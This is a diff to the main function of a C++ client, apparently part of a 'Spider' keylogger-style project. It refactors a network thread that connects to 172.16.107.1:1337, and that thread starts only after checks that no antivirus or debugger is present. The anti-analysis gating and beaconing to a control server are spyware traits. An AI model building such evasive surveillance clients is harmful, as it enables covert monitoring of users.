@@ -1,6 +1,7 @@
 #include "Network.h"
 #include <cstdlib>
 #include <thread>
+#include <iostream>
 #include "Logger.hpp"
 #include "Core.h"
 #include "AntiDbg.h"
@@ -39,18 +40,20 @@ int main()
         if (!spider::misc::Debugger::isBeingAV() && !spider::misc::Debugger::isDebuggerPresent())
         {
             // Start network thread
-            spider::client::Network net(core.getSendToNetwork(), core.getReceivedFromNetwork());
             std::thread networkThread([&]() {
-				try
-				{
-					net.run(1337, "172.16.107.1", true);
-				}
-				catch (std::exception const &err) {
-					nope::log::Log(Error) << err.what();
-				}
+                try
+                {
+                    spider::client::Network net(core.getSendToNetwork(), core.getReceivedFromNetwork(), core.getResponseQueue());
+                    net.run(1337, "172.16.107.1", true);
+                }
+                catch (std::exception const &err)
+                {
+                    nope::log::Log(Error) << "Network: " << err.what();
+                }
             });
 
             // Run core
+            core.init();
             ret = core.run();
 
             // Stop thread
@@ -62,8 +65,8 @@ int main()
     }
     catch (std::exception const &e)
     {
-        nope::log::Log(Error) << e.what();
-		system("pause");
+        nope::log::Log(Error) << "Error: " << e.what();
+        system("pause");
         ret = EXIT_FAILURE;
     }
 
